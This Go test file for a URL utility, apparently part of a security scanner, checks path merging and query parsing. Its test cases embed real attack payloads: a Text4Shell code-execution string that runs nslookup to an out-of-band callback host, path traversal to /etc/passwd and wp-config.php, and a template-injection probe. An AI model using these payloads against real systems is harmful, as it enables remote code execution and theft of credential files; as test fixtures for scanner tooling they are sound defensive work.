package urlutil

import (
	"path"
	"testing"
)

func TestSimplePaths(t *testing.T) {
	// Merge Examples (Same as path.Join)
	// /blog   /admin => /blog/admin
	// /blog/test /wp-content  => /blog/wp/wp-content
	// /blog/admin /blog/admin/profile => /blog/admin/profile
	// /blog /blog/ => /blog/
	testcase1 := []struct {
		Path1 string
		Path2 string
	}{
		{"/blog", "/admin"},
		{"/", "/"},
		{"", "/admin"},
		{"/blog/test", "/wp-content"},
		{"/blog/test/", "/blog"},
		{"/blog/test/profile", "/blog"},
		{"/blog/test/", "/blog/test/profile"},
		{"/blog/", "/blog"},
	}

	for _, v := range testcase1 {
		pathtest := path.Join(v.Path1, v.Path2)
		mergetest := mergePaths(v.Path1, v.Path2)
		if pathtest != mergetest {
			t.Errorf("merge failure expected %v but got %v", pathtest, mergetest)
		}
	}
}

func TestMergeUnsafePaths(t *testing.T) {
	/*
		Merge Examples with payloads and unsafe characters
	*/
	testcase2 := []struct {
		url      string // can also be a relative path
		Path2    string
		Expected string //Path
	}{
		{"/admin", "/%20test%0a", "/admin/%20test%0a"},
		{"scanme.sh", "%20test%0a", "%20test%0a"},
		{"https://scanme.sh", "/%20test%0a", "/%20test%0a"},
		{"/?admin=true", "/path?yes=true", "/path"},
		{"scanme.sh", "../../../etc/passwd", "../../../etc/passwd"},
		{"//scanme.sh", "/..%252F..%252F..%252F..%252F..%252F", "/..%252F..%252F..%252F..%252F..%252F"},
		// {"/?user=true", "/profile", "/profile?user=true"},
	}

	for _, v := range testcase2 {
		rurl, err := ParseURL(v.url, false)
		if err != nil {
			t.Errorf(err.Error())
			continue
		}
		rurl.MergePath(v.Path2, true)
		if rurl.Path != v.Expected {
			t.Errorf("expected %v but got %v", v.Expected, rurl.Path)
		}
	}
}

func TestMergeWithParams(t *testing.T) {
	testcase := []struct {
		url      string // can also be a relative path
		Path2    string
		Expected string //Full URL
	}{
		{"/", "/path/scan?param=yes", "/path/scan?param=yes"},
		{"/admin/?param=path", "profile?show=true", "/admin/profile?param=path&show=true"},
		{"/?admin=true", "/%20test%0a", "/%20test%0a?admin=true"},
		{"https://scanme.sh?admin=true", "/%20test%0a", "https://scanme.sh/%20test%0a?admin=true"},
		{"scanme.sh?admin=true", "/%20test%0a", "scanme.sh/%20test%0a?admin=true"},
		{"http://scanme.sh/?admin=true", "/%20test%0a", "http://scanme.sh/%20test%0a?admin=true"},
		{"https://scanme.sh?admin=true", "/%20test%0a", "https://scanme.sh/%20test%0a?admin=true"},
		{"scanme.sh", "/path", "scanme.sh/path"},
		{"scanme.sh?wp=false", "/path?yes=true&admin=false", "scanme.sh/path?admin=false&wp=false&yes=true"},
	}
	for _, v := range testcase {
		rurl, err := ParseURL(v.url, false)
		if err != nil {
			t.Errorf(err.Error())
			continue
		}
		rurl.MergePath(v.Path2, true)
		if v.Expected != rurl.String() {
			t.Errorf("expected %v but got %v", v.Expected, rurl.String())
		}
	}
}

func TestAutoMergePaths(t *testing.T) {
	testcase := []struct {
		path1    string // can also be a relative path
		Path2    string
		Expected string //Full URL
	}{
		{"/", "/path/scan?param=yes", "/path/scan?param=yes"},
		{"/admin/?param=path", "profile?show=true", "/admin/profile?param=path&show=true"},
		{"/?admin=true", "/%20test%0a", "/%20test%0a?admin=true"},
	}

	for _, v := range testcase {
		got := AutoMergePaths(v.path1, v.Path2)
		if v.Expected != got {
			t.Errorf("expected %v but got %v", v.Expected, got)
		}
	}
}

func TestParameterParsing(t *testing.T) {
	testcases := []struct {
		URL           string
		ExpectedQuery string
	}{
		{"/text4shell/attack?search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d", "search=$%7bscript:javascript:java.lang.Runtime.getRuntime().exec('nslookup%20{{Host}}.{{Port}}.getparam.{{interactsh-url}}')%7d"},
		{"/filedownload.php?ebookdownloadurl=../../../wp-config.php", "ebookdownloadurl=../../../wp-config.php"},
		{"/oauth/authorize?response_type=${13337*73331}&client_id=acme&scope=openid&redirect_uri=http://test", "client_id=acme&redirect_uri=http://test&response_type=${13337*73331}&scope=openid"},
	}
	for _, v := range testcases {
		rurl, err := ParseURL(v.URL, false)
		if err != nil {
			t.Error(err)
			continue
		}
		if v.ExpectedQuery != rurl.params.Encode() {
			t.Errorf("expected: %v\ngot: %v\n", v.ExpectedQuery, rurl.params.Encode())
		}
	}
}
